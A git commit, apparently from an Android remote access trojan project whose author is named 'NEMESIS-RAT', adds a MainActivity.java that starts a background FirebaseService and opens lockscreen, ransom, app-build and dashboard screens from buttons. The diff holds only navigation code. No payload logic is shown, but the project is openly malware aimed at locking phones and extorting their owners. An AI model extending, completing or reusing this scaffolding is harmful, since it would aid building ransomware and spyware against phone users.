55ce037feb6ab8aebf8422b3e8f7f82bd60fc90b
NEMESIS-RAT <wwkwkk52@gmail.com>
2026-08-11 00:08:59 +0700

    Update MainActivity.java

--- app/src/main/java/com/nemesis/MainActivity.java
+++ app/src/main/java/com/nemesis/MainActivity.java
@@ -1,1 +1,27 @@
+package com.nemesis;
 
+import android.content.Intent;
+import android.os.Bundle;
+import android.widget.Button;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        startService(new Intent(this, FirebaseService.class));
+
+        Button btnLock = findViewById(R.id.btnLock);
+        Button btnRansom = findViewById(R.id.btnRansom);
+        Button btnAppBuild = findViewById(R.id.btnAppBuild);
+        Button btnDashboard = findViewById(R.id.btnDashboard);
+
+        btnLock.setOnClickListener(v -> startActivity(new Intent(this, LockscreenActivity.class)));
+        btnRansom.setOnClickListener(v -> startActivity(new Intent(this, RansomActivity.class)));
+        btnAppBuild.setOnClickListener(v -> startActivity(new Intent(this, AppBuildActivity.class)));
+        btnDashboard.setOnClickListener(v -> startActivity(new Intent(this, DashboardActivity.class)));
+    }
+}
